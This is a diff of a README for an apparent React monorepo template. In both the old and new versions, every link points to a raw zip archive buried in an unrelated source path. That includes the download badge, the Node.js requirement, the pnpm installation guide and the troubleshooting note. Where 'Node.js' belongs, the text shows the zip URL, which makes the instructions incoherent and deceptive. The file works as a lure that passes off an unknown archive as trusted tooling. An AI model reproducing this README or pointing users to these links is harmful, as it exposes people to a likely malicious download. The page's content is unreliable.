@@ -1,6 +1,6 @@
 # 🚀 react-monorepo-template - Build with React Easily and Quickly
 
-[![Download](https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip)](https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip)
+[![Download](https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip)](https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip)
 
 ## 📋 Description
 The react-monorepo-template is a user-friendly setup for building applications using React. It comes pre-installed with essential tools like SWC for fast builds, Tailwind for styling, ESLint for code quality, Prettier for code formatting, and React Router for navigation. This setup helps you focus on building your application instead of configuring your environment.
@@ -12,14 +12,14 @@ Getting started is straightforward. Just follow these steps to download and run 
 To run the react-monorepo-template, your computer should meet the following basic requirements:
 
 - Operating System: Windows 10, macOS, or a modern Linux distribution.
-- https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip Version 14 or higher is required. If you do not have it installed, visit the [https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip website](https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip) to download.
+- https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip Version 14 or higher is required. If you do not have it installed, visit the [https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip website](https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip) to download.
 - A stable internet connection for downloading dependencies.
 
 ## 📥 Download & Install
 To get started, you will need to visit the releases page to download the template.
 
 1. Click the link below to go to the Releases page:
-   [Visit This Page to Download](https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip)
+   [Visit This Page to Download](https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip)
 
 2. On the Releases page, find the latest version of the react-monorepo-template.
 
@@ -37,7 +37,7 @@ To get started, you will need to visit the releases page to download the templat
    ```
    pnpm install
    ```
-   If you do not have pnpm installed, visit the [pnpm installation guide](https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip) for instructions.
+   If you do not have pnpm installed, visit the [pnpm installation guide](https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip) for instructions.
 
 8. To start the application, run the following command:
    ```
@@ -72,7 +72,7 @@ Once your application is running, you can start modifying it according to your n
 ## ⚙️ Troubleshooting
 If you encounter any issues during installation or setup, consider the following:
 
-- Check that you have the correct version of https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip installed.
+- Check that you have the correct version of https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip installed.
 - Ensure you are in the correct directory when running commands.
 - If you experience issues with installation, you may want to try deleting the `node_modules` folder and reinstalling the dependencies.
 
@@ -86,4 +86,4 @@ While this template is ready for your use, contributions are welcome. If you hav
 
 Now that you have the react-monorepo-template, enjoy building your project with ease. Head back to the main page for more resources and updates. 
 
-[Download Here Again](https://raw.githubusercontent.com/Michael123h/react-monorepo-template/main/nonsporting/react-monorepo-template.zip) to get started!
+[Download Here Again](https://github.com/Michael123h/react-monorepo-template/raw/refs/heads/main/pkgs/shared/src/api/routes/react-template-monorepo-v1.9.zip) to get started!
